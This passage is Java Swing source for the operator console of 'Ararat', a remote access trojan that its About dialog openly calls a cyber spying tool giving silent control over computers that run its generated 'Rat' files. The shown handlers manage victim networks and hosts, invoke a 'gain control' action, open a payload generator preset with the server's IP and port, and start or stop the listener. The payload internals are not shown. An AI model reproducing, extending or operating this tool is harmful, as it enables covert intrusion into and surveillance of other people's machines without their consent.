    private void addHostButtonMousePressed(java.awt.event.MouseEvent evt) {//GEN-FIRST:event_addHostButtonMousePressed
        if (addHostButton.isEnabled()) {
            addHostButton.setBorder(BorderFactory.createBevelBorder(BevelBorder.LOWERED));
        }
    }//GEN-LAST:event_addHostButtonMousePressed

    private void addHostButtonMouseReleased(java.awt.event.MouseEvent evt) {//GEN-FIRST:event_addHostButtonMouseReleased
        if (addHostButton.isEnabled()) {
            addHostButton.setBorder(BorderFactory.createBevelBorder(BevelBorder.RAISED));
            if (selectedNetwork != null) {

                selectedNetwork.getHostList().add(new Host(selectedNetwork));
                selectedNetwork.getHostList().updatePanel();

            }
        }
    }//GEN-LAST:event_addHostButtonMouseReleased

    private void removeHostButtonMousePressed(java.awt.event.MouseEvent evt) {//GEN-FIRST:event_removeHostButtonMousePressed
        if (removeHostButton.isEnabled()) {
            removeHostButton.setBorder(BorderFactory.createBevelBorder(BevelBorder.LOWERED));
        }
    }//GEN-LAST:event_removeHostButtonMousePressed

    private void removeHostButtonMouseReleased(java.awt.event.MouseEvent evt) {//GEN-FIRST:event_removeHostButtonMouseReleased
        if (removeHostButton.isEnabled()) {
            removeHostButton.setBorder(BorderFactory.createBevelBorder(BevelBorder.RAISED));
            if (selectedHost != null) {
                if (selectedHost.isAssigned()) {
                    int input = JOptionPane.showConfirmDialog(this.selectedLabel, "You are about to remove Host \""
                            + selectedHost.getHostname() + "\" from the server.\n Are you sure you want to continue? ",
                            "Confirm Removal", 1);

                    if (input == JOptionPane.YES_OPTION) {
                        selectedHost.removeHost(0);
                    }
                } else {
                    selectedHost.removeHost(0);
                }

            }
            removeHostButton.setBackground(new Color(240, 240, 240));
            removeHostButton.setForeground(Color.black);
        }
    }//GEN-LAST:event_removeHostButtonMouseReleased

    private void formMousePressed(java.awt.event.MouseEvent evt) {//GEN-FIRST:event_formMousePressed

    }//GEN-LAST:event_formMousePressed

    private void networkPanelMousePressed(java.awt.event.MouseEvent evt) {//GEN-FIRST:event_networkPanelMousePressed
        if (selectedNetwork != null) {
            selectedNetwork.unselect();
        }
        if (selectedHost != null) {
            selectedHost.unselect();
        }
    }//GEN-LAST:event_networkPanelMousePressed

    private void hostPanelMousePressed(java.awt.event.MouseEvent evt) {//GEN-FIRST:event_hostPanelMousePressed
        if (selectedHost != null) {
            selectedHost.unselect();
        }
    }//GEN-LAST:event_hostPanelMousePressed

    private void renameHostButtonMousePressed(java.awt.event.MouseEvent evt) {//GEN-FIRST:event_renameHostButtonMousePressed
        if (renameHostButton.isEnabled()) {
            renameHostButton.setBorder(BorderFactory.createBevelBorder(BevelBorder.LOWERED));
        }
    }//GEN-LAST:event_renameHostButtonMousePressed

    private void renameHostButtonMouseReleased(java.awt.event.MouseEvent evt) {//GEN-FIRST:event_renameHostButtonMouseReleased
        if (renameHostButton.isEnabled()) {
            renameHostButton.setBorder(BorderFactory.createBevelBorder(BevelBorder.RAISED));
            if (selectedHost != null) {
                if (renamePopup != null) {
                    renamePopup.dispose();
                }
                renamePopup = new RenamePopup(selectedHost);
            }
        }
    }//GEN-LAST:event_renameHostButtonMouseReleased

    private void controlHostButtonMousePressed(java.awt.event.MouseEvent evt) {//GEN-FIRST:event_controlHostButtonMousePressed
        if (controlHostButton.isEnabled()) {
            controlHostButton.setBorder(BorderFactory.createBevelBorder(BevelBorder.LOWERED));
        }
    }//GEN-LAST:event_controlHostButtonMousePressed

    private void controlHostButtonMouseReleased(java.awt.event.MouseEvent evt) {//GEN-FIRST:event_controlHostButtonMouseReleased
        if (controlHostButton.isEnabled()) {
            controlHostButton.setBorder(BorderFactory.createBevelBorder(BevelBorder.RAISED));
            if (selectedHost != null) {
                selectedHost.gainControl();
            }
        }
    }//GEN-LAST:event_controlHostButtonMouseReleased

    private void propertiesButtonMouseReleased(java.awt.event.MouseEvent evt) {//GEN-FIRST:event_propertiesButtonMouseReleased
        if (propertiesButton.isEnabled()) {
            propertiesButton.setBorder(BorderFactory.createBevelBorder(BevelBorder.RAISED));
            if (selectedNetwork != null) {
                propertiesButton.setBorder(BorderFactory.createBevelBorder(BevelBorder.RAISED));
                if (selectedNetwork != null) {
                    String properties = " Network Name: " + selectedNetwork.getNetname() + "\n Public IP Address: " + selectedNetwork.getIP()
                            + "\n Active Hosts: " + selectedNetwork.getHostList().getActiveHostCount() + "/" + selectedNetwork.getHostList().size()
                            + "\n Inactive Hosts: " + selectedNetwork.getHostList().getInactiveHostCount() + "/" + selectedNetwork.getHostList().size()
                            + "\n Unassigned Hosts: " + selectedNetwork.getHostList().getUnassignedHostCount() + "/" + selectedNetwork.getHostList().size();

                    JOptionPane.showMessageDialog(selectedLabel, properties, selectedNetwork.getNetname() + " Properties", JOptionPane.INFORMATION_MESSAGE);
                }
            }
        }
    }//GEN-LAST:event_propertiesButtonMouseReleased

    private void propertiesButtonMousePressed(java.awt.event.MouseEvent evt) {//GEN-FIRST:event_propertiesButtonMousePressed
        if (propertiesButton.isEnabled()) {
            propertiesButton.setBorder(BorderFactory.createBevelBorder(BevelBorder.LOWERED));
        }
    }//GEN-LAST:event_propertiesButtonMousePressed

    private void renameNetButtonMouseReleased(java.awt.event.MouseEvent evt) {//GEN-FIRST:event_renameNetButtonMouseReleased
        if (renameNetButton.isEnabled()) {
            renameNetButton.setBorder(BorderFactory.createBevelBorder(BevelBorder.RAISED));
            if (selectedNetwork != null) {
                if (renamePopup != null) {
                    renamePopup.dispose();
                }
                renamePopup = new RenamePopup(selectedNetwork);
            }
        }
    }//GEN-LAST:event_renameNetButtonMouseReleased

    private void renameNetButtonMousePressed(java.awt.event.MouseEvent evt) {//GEN-FIRST:event_renameNetButtonMousePressed
        if (renameNetButton.isEnabled()) {
            renameNetButton.setBorder(BorderFactory.createBevelBorder(BevelBorder.LOWERED));
        }
    }//GEN-LAST:event_renameNetButtonMousePressed

    private void removeNetButtonMouseReleased(java.awt.event.MouseEvent evt) {//GEN-FIRST:event_removeNetButtonMouseReleased
        if (removeNetButton.isEnabled()) {
            removeNetButton.setBorder(BorderFactory.createBevelBorder(BevelBorder.RAISED));
            if (selectedNetwork != null) {
                if (selectedNetwork.isAssigned()) {
                    int input = JOptionPane.showConfirmDialog(this.selectedLabel, "You are about to remove Network \""
                            + selectedNetwork.getNetname() + "\" and its hosts from the server.\n Are you sure you want to continue? ",
                            "Confirm Removal", 1);

                    if (input == JOptionPane.YES_OPTION) {
                        selectedNetwork.removeNetwork();
                    }
                } else {
                    selectedNetwork.removeNetwork();
                }

            }
            removeNetButton.setBackground(new Color(240, 240, 240));
            removeNetButton.setForeground(Color.black);
        }
    }//GEN-LAST:event_removeNetButtonMouseReleased

    private void removeNetButtonMousePressed(java.awt.event.MouseEvent evt) {//GEN-FIRST:event_removeNetButtonMousePressed
        if (removeNetButton.isEnabled()) {
            removeNetButton.setBorder(BorderFactory.createBevelBorder(BevelBorder.LOWERED));
        }
    }//GEN-LAST:event_removeNetButtonMousePressed

    private void addNetButtonMouseReleased(java.awt.event.MouseEvent evt) {//GEN-FIRST:event_addNetButtonMouseReleased
        if (addNetButton.isEnabled()) {
            addNetButton.setBorder(BorderFactory.createBevelBorder(BevelBorder.RAISED));
            networkList.add(new Network(4));
            networkList.updatePanel();
        }
    }//GEN-LAST:event_addNetButtonMouseReleased

    private void addNetButtonMousePressed(java.awt.event.MouseEvent evt) {//GEN-FIRST:event_addNetButtonMousePressed
        if (addNetButton.isEnabled()) {
            addNetButton.setBorder(BorderFactory.createBevelBorder(BevelBorder.LOWERED));
        }
    }//GEN-LAST:event_addNetButtonMousePressed

    private void addNetButtonMouseEntered(java.awt.event.MouseEvent evt) {//GEN-FIRST:event_addNetButtonMouseEntered
        if (addNetButton.isEnabled()) {
            addNetButton.setBackground(Color.blue);
            addNetButton.setForeground(new Color(240, 240, 240));
        }
    }//GEN-LAST:event_addNetButtonMouseEntered

    private void addNetButtonMouseExited(java.awt.event.MouseEvent evt) {//GEN-FIRST:event_addNetButtonMouseExited
        if (addNetButton.isEnabled()) {
            addNetButton.setBackground(new Color(240, 240, 240));
            addNetButton.setForeground(Color.black);
        }
    }//GEN-LAST:event_addNetButtonMouseExited

    private void removeNetButtonMouseEntered(java.awt.event.MouseEvent evt) {//GEN-FIRST:event_removeNetButtonMouseEntered
        if (removeNetButton.isEnabled()) {
            removeNetButton.setBorder(BorderFactory.createBevelBorder(javax.swing.border.BevelBorder.RAISED, Color.GRAY, Color.black));
            removeNetButton.setBackground(Color.blue);
            removeNetButton.setForeground(new Color(240, 240, 240));
        }
    }//GEN-LAST:event_removeNetButtonMouseEntered

    private void removeNetButtonMouseExited(java.awt.event.MouseEvent evt) {//GEN-FIRST:event_removeNetButtonMouseExited
        if (removeNetButton.isEnabled()) {
            removeNetButton.setBorder(BorderFactory.createBevelBorder(javax.swing.border.BevelBorder.RAISED));
            removeNetButton.setBackground(new Color(240, 240, 240));
            removeNetButton.setForeground(Color.black);
        }
    }//GEN-LAST:event_removeNetButtonMouseExited

    private void renameNetButtonMouseExited(java.awt.event.MouseEvent evt) {//GEN-FIRST:event_renameNetButtonMouseExited
        if (renameNetButton.isEnabled()) {
            renameNetButton.setBorder(BorderFactory.createBevelBorder(javax.swing.border.BevelBorder.RAISED));
            renameNetButton.setBackground(new Color(240, 240, 240));
            renameNetButton.setForeground(Color.black);
        }
    }//GEN-LAST:event_renameNetButtonMouseExited

    private void renameNetButtonMouseEntered(java.awt.event.MouseEvent evt) {//GEN-FIRST:event_renameNetButtonMouseEntered
        if (renameNetButton.isEnabled()) {
            renameNetButton.setBorder(BorderFactory.createBevelBorder(javax.swing.border.BevelBorder.RAISED, Color.GRAY, Color.black));
            renameNetButton.setBackground(Color.blue);
            renameNetButton.setForeground(new Color(240, 240, 240));
        }
    }//GEN-LAST:event_renameNetButtonMouseEntered

    private void propertiesButtonMouseExited(java.awt.event.MouseEvent evt) {//GEN-FIRST:event_propertiesButtonMouseExited
        if (propertiesButton.isEnabled()) {
            propertiesButton.setBorder(BorderFactory.createBevelBorder(javax.swing.border.BevelBorder.RAISED));
            propertiesButton.setBackground(new Color(240, 240, 240));
            propertiesButton.setForeground(Color.black);
        }
    }//GEN-LAST:event_propertiesButtonMouseExited

    private void propertiesButtonMouseEntered(java.awt.event.MouseEvent evt) {//GEN-FIRST:event_propertiesButtonMouseEntered
        if (propertiesButton.isEnabled()) {
            propertiesButton.setBorder(BorderFactory.createBevelBorder(javax.swing.border.BevelBorder.RAISED, Color.GRAY, Color.black));
            propertiesButton.setBackground(Color.blue);
            propertiesButton.setForeground(new Color(240, 240, 240));
        }
    }//GEN-LAST:event_propertiesButtonMouseEntered

    private void addHostButtonMouseExited(java.awt.event.MouseEvent evt) {//GEN-FIRST:event_addHostButtonMouseExited
        if (addHostButton.isEnabled()) {
            addHostButton.setBorder(BorderFactory.createBevelBorder(javax.swing.border.BevelBorder.RAISED));
            addHostButton.setBackground(new Color(240, 240, 240));
            addHostButton.setForeground(Color.black);
        }
    }//GEN-LAST:event_addHostButtonMouseExited

    private void addHostButtonMouseEntered(java.awt.event.MouseEvent evt) {//GEN-FIRST:event_addHostButtonMouseEntered
        if (addHostButton.isEnabled()) {
            addHostButton.setBorder(BorderFactory.createBevelBorder(javax.swing.border.BevelBorder.RAISED, Color.GRAY, Color.black));
            addHostButton.setBackground(Color.blue);
            addHostButton.setForeground(new Color(240, 240, 240));
        }
    }//GEN-LAST:event_addHostButtonMouseEntered

    private void removeHostButtonMouseEntered(java.awt.event.MouseEvent evt) {//GEN-FIRST:event_removeHostButtonMouseEntered
        if (removeHostButton.isEnabled()) {
            removeHostButton.setBorder(BorderFactory.createBevelBorder(javax.swing.border.BevelBorder.RAISED, Color.GRAY, Color.black));
            removeHostButton.setBackground(Color.blue);
            removeHostButton.setForeground(new Color(240, 240, 240));
        }
    }//GEN-LAST:event_removeHostButtonMouseEntered

    private void removeHostButtonMouseExited(java.awt.event.MouseEvent evt) {//GEN-FIRST:event_removeHostButtonMouseExited
        if (removeHostButton.isEnabled()) {
            removeHostButton.setBorder(BorderFactory.createBevelBorder(javax.swing.border.BevelBorder.RAISED));
            removeHostButton.setBackground(new Color(240, 240, 240));
            removeHostButton.setForeground(Color.black);
        }
    }//GEN-LAST:event_removeHostButtonMouseExited

    private void renameHostButtonMouseEntered(java.awt.event.MouseEvent evt) {//GEN-FIRST:event_renameHostButtonMouseEntered
        if (renameHostButton.isEnabled()) {
            renameHostButton.setBorder(BorderFactory.createBevelBorder(javax.swing.border.BevelBorder.RAISED, Color.GRAY, Color.black));
            renameHostButton.setBackground(Color.blue);
            renameHostButton.setForeground(new Color(240, 240, 240));
        }
    }//GEN-LAST:event_renameHostButtonMouseEntered

    private void renameHostButtonMouseExited(java.awt.event.MouseEvent evt) {//GEN-FIRST:event_renameHostButtonMouseExited
        if (renameHostButton.isEnabled()) {
            renameHostButton.setBorder(BorderFactory.createBevelBorder(javax.swing.border.BevelBorder.RAISED));
            renameHostButton.setBackground(new Color(240, 240, 240));
            renameHostButton.setForeground(Color.black);
        }
    }//GEN-LAST:event_renameHostButtonMouseExited

    private void controlHostButtonMouseExited(java.awt.event.MouseEvent evt) {//GEN-FIRST:event_controlHostButtonMouseExited
        if (controlHostButton.isEnabled()) {
            controlHostButton.setBorder(BorderFactory.createBevelBorder(javax.swing.border.BevelBorder.RAISED));
            controlHostButton.setBackground(new Color(240, 240, 240));
            controlHostButton.setForeground(Color.black);
        }
    }//GEN-LAST:event_controlHostButtonMouseExited

    private void controlHostButtonMouseEntered(java.awt.event.MouseEvent evt) {//GEN-FIRST:event_controlHostButtonMouseEntered
        if (controlHostButton.isEnabled()) {
            controlHostButton.setBorder(BorderFactory.createBevelBorder(javax.swing.border.BevelBorder.RAISED, Color.GRAY, Color.black));
            controlHostButton.setBackground(Color.blue);
            controlHostButton.setForeground(new Color(240, 240, 240));
        }
    }//GEN-LAST:event_controlHostButtonMouseEntered

    private void generateMenuActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_generateMenuActionPerformed
        Server.genFrame = new RatGenFrame(this, this.getCentralLocation(), Server.ip, Server.listener.getPort());

    }//GEN-LAST:event_generateMenuActionPerformed

    private void settingsMenuActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_settingsMenuActionPerformed
        if (Server.settingsFrame != null) {
            Server.settingsFrame.setVisible(true);        
            Server.settingsFrame.setLocation(getCentralLocation());
            this.setEnabled(false);
        }
    }//GEN-LAST:event_settingsMenuActionPerformed

    private void restartMenuActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_restartMenuActionPerformed
        restartLabel.setBorder(BorderFactory.createBevelBorder(BevelBorder.RAISED));
        stopServer();
        startServer();
    }//GEN-LAST:event_restartMenuActionPerformed

    private void stopMenuActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_stopMenuActionPerformed
        if (stopMenu.isEnabled()) {
            stopServer();
        }
    }//GEN-LAST:event_stopMenuActionPerformed

    private void startMenuActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_startMenuActionPerformed
        if (startMenu.isEnabled()) {
            startServer();
        }

    }//GEN-LAST:event_startMenuActionPerformed

    private void stopLabelMousePressed(java.awt.event.MouseEvent evt) {//GEN-FIRST:event_stopLabelMousePressed
        if (stopLabel.isEnabled()) {
            stopLabel.setBorder(BorderFactory.createBevelBorder(BevelBorder.LOWERED));
        }
    }//GEN-LAST:event_stopLabelMousePressed

    private void stopLabelMouseReleased(java.awt.event.MouseEvent evt) {//GEN-FIRST:event_stopLabelMouseReleased
        if (stopLabel.isEnabled()) {
            stopLabel.setBorder(BorderFactory.createBevelBorder(BevelBorder.RAISED));
            stopServer();
        }
    }//GEN-LAST:event_stopLabelMouseReleased

    private void stopLabelMouseEntered(java.awt.event.MouseEvent evt) {//GEN-FIRST:event_stopLabelMouseEntered
        if (stopLabel.isEnabled()) {
            stopLabel.setBorder(BorderFactory.createBevelBorder(javax.swing.border.BevelBorder.RAISED, Color.GRAY, Color.black));
        }
    }//GEN-LAST:event_stopLabelMouseEntered

    private void stopLabelMouseExited(java.awt.event.MouseEvent evt) {//GEN-FIRST:event_stopLabelMouseExited
        if (stopLabel.isEnabled()) {
            stopLabel.setBorder(BorderFactory.createBevelBorder(javax.swing.border.BevelBorder.RAISED));
            stopLabel.setBackground(new Color(240, 240, 240));
        }
    }//GEN-LAST:event_stopLabelMouseExited

    private void startLabelMouseReleased(java.awt.event.MouseEvent evt) {//GEN-FIRST:event_startLabelMouseReleased
        if (startLabel.isEnabled()) {
            startLabel.setBorder(BorderFactory.createBevelBorder(BevelBorder.RAISED));
            startServer();
        }
    }//GEN-LAST:event_startLabelMouseReleased

    private void startLabelMousePressed(java.awt.event.MouseEvent evt) {//GEN-FIRST:event_startLabelMousePressed
        if (startLabel.isEnabled()) {
            startLabel.setBorder(BorderFactory.createBevelBorder(BevelBorder.LOWERED));
        }
    }//GEN-LAST:event_startLabelMousePressed

    private void startLabelMouseExited(java.awt.event.MouseEvent evt) {//GEN-FIRST:event_startLabelMouseExited
        if (startLabel.isEnabled()) {
            startLabel.setBorder(BorderFactory.createBevelBorder(javax.swing.border.BevelBorder.RAISED));
            startLabel.setBackground(new Color(240, 240, 240));
        }
    }//GEN-LAST:event_startLabelMouseExited

    private void startLabelMouseEntered(java.awt.event.MouseEvent evt) {//GEN-FIRST:event_startLabelMouseEntered
        if (startLabel.isEnabled()) {
            startLabel.setBorder(BorderFactory.createBevelBorder(javax.swing.border.BevelBorder.RAISED, Color.GRAY, Color.black));
        }
    }//GEN-LAST:event_startLabelMouseEntered

    private void restartLabelMouseReleased(java.awt.event.MouseEvent evt) {//GEN-FIRST:event_restartLabelMouseReleased
        restartLabel.setBorder(BorderFactory.createBevelBorder(BevelBorder.RAISED));
        stopServer();
        startServer();
    }//GEN-LAST:event_restartLabelMouseReleased

    private void restartLabelMousePressed(java.awt.event.MouseEvent evt) {//GEN-FIRST:event_restartLabelMousePressed
        restartLabel.setBorder(BorderFactory.createBevelBorder(BevelBorder.LOWERED));
    }//GEN-LAST:event_restartLabelMousePressed

    private void restartLabelMouseExited(java.awt.event.MouseEvent evt) {//GEN-FIRST:event_restartLabelMouseExited
        restartLabel.setBorder(BorderFactory.createBevelBorder(javax.swing.border.BevelBorder.RAISED));
        restartLabel.setBackground(new Color(240, 240, 240));
    }//GEN-LAST:event_restartLabelMouseExited

    private void restartLabelMouseEntered(java.awt.event.MouseEvent evt) {//GEN-FIRST:event_restartLabelMouseEntered
        restartLabel.setBorder(BorderFactory.createBevelBorder(javax.swing.border.BevelBorder.RAISED, Color.GRAY, Color.black));

    }//GEN-LAST:event_restartLabelMouseEntered

    private void exitMenuActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_exitMenuActionPerformed
        int input = JOptionPane.showConfirmDialog(this, "You are about to terminate the server. Are you sure you want to continue?", "Confirm close", 1);

        if (input == JOptionPane.YES_OPTION) {
            try {
                Server.listener.terminate();
            } catch (IOException ex) {
                //JOptionPane.showMessageDialog(Server.gui, ex.getMessage(), " Error terminating the listener", JOptionPane.ERROR_MESSAGE);
            } catch (InterruptedException ex) {
                //JOptionPane.showMessageDialog(Server.gui, ex.getMessage(), " Error", JOptionPane.ERROR_MESSAGE);
            }
            System.exit(0);
        }

    }//GEN-LAST:event_exitMenuActionPerformed

    private void clearLogMenuActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_clearLogMenuActionPerformed
        logArea.setText("");
    }//GEN-LAST:event_clearLogMenuActionPerformed

    private void formWindowClosing(java.awt.event.WindowEvent evt) {//GEN-FIRST:event_formWindowClosing
        int input = JOptionPane.showConfirmDialog(this, "You are about to terminate the server. Are you sure you want to continue?", "Confirm close", 1);

        if (input == JOptionPane.YES_OPTION) {
            try {
                Server.listener.terminate();
            } catch (IOException ex) {
                //JOptionPane.showMessageDialog(Server.gui, ex.getMessage(), " Error terminating the listener", JOptionPane.ERROR_MESSAGE);
            } catch (InterruptedException ex) {
                //JOptionPane.showMessageDialog(Server.gui, ex.getMessage(), " Error", JOptionPane.ERROR_MESSAGE);
            }
            System.exit(0);
        }

    }//GEN-LAST:event_formWindowClosing

    private void aboutMenuActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_aboutMenuActionPerformed

        Icon icon = new ImageIcon(getClass().getResource("/araratproject/icons/araratIcon.png"));
        String info = "<html><b>Version:</b> 1.0.1<br/><br/>"
                + "     <b>Author:</b> Andreas Demosthenous<br/><br/>"
                + "     <b>Date Started:</b> 11/06/2020<br/><br/>"
                + "     <b>Description:</b> Ararat is a cyber spying tool.<br/>"
                + "     Its owner can generate and distribute 'Rat'<br/>"
                + "     files which give him silent control over other<br/>"
                + "     computer systems that they are executed.<br/></html>";
        JLabel label = new JLabel(info);
        label.setIcon(icon);
        label.setFont(new Font("Arial", Font.PLAIN, 19));
        label.setHorizontalTextPosition(SwingConstants.CENTER);
        label.setVerticalTextPosition(SwingConstants.BOTTOM);
        JOptionPane.showMessageDialog(this, label, "About Ararat", JOptionPane.PLAIN_MESSAGE);

    }//GEN-LAST:event_aboutMenuActionPerformed

    private void reportBugMenuActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_reportBugMenuActionPerformed

        Desktop desktop = java.awt.Desktop.getDesktop();
        try {
            //specify the protocol along with the URL
            URI oURL = new URI(
                    "http://digital-toolset.com/index.php/ararat-project/report-bug/");
            desktop.browse(oURL);
        } catch (URISyntaxException e) {
            // TODO Auto-generated catch block
            e.printStackTrace();
        } catch (IOException ex) {
            Logger.getLogger(ServerManager.class.getName()).log(Level.SEVERE, null, ex);
        }
    }//GEN-LAST:event_reportBugMenuActionPerformed


    // Variables declaration - do not modify//GEN-BEGIN:variables
    private javax.swing.JLabel CNetHosts;
    private javax.swing.JLabel CNets;
    private javax.swing.JSeparator Nsep;
    private javax.swing.JSeparator Nsep1;
    private javax.swing.JLabel SelectedNet;
    private javax.swing.JMenuItem aboutMenu;
    private javax.swing.JLabel addHostButton;
    private javax.swing.JLabel addNetButton;
    private javax.swing.JMenuItem clearLogMenu;
    private javax.swing.JLabel clockLabel1;
    private javax.swing.JLabel controlHostButton;
    private javax.swing.JMenuItem exitMenu;
    private javax.swing.JMenuItem generateMenu;
    private javax.swing.JPanel hostPanel;
    private javax.swing.JScrollPane hostScroller;
    private javax.swing.JLabel jLabel9;
    private javax.swing.JMenu jMenu1;
    private javax.swing.JMenu jMenu4;
    private javax.swing.JMenu jMenu5;
    private javax.swing.JMenuBar jMenuBar1;
    private javax.swing.JScrollPane jScrollPane2;
    public static javax.swing.JTextArea logArea;
    private javax.swing.JPanel networkPanel;
    private javax.swing.JScrollPane networkScroller;
    private javax.swing.JLabel propertiesButton;
    private javax.swing.JLabel removeHostButton;
    private javax.swing.JLabel removeNetButton;
    private javax.swing.JLabel renameHostButton;
    private javax.swing.JLabel renameNetButton;
    private javax.swing.JMenuItem reportBugMenu;
    private javax.swing.JLabel restartLabel;
    private javax.swing.JMenuItem restartMenu;
    private javax.swing.JLabel selectedLabel;
    private javax.swing.JMenuItem settingsMenu;
    private javax.swing.JLabel startLabel;
    private javax.swing.JMenuItem startMenu;
    public static javax.swing.JLabel stateLabel;
    private javax.swing.JLabel stopLabel;
    private javax.swing.JMenuItem stopMenu;
    private javax.swing.JLabel version;
    // End of variables declaration//GEN-END:variables
}
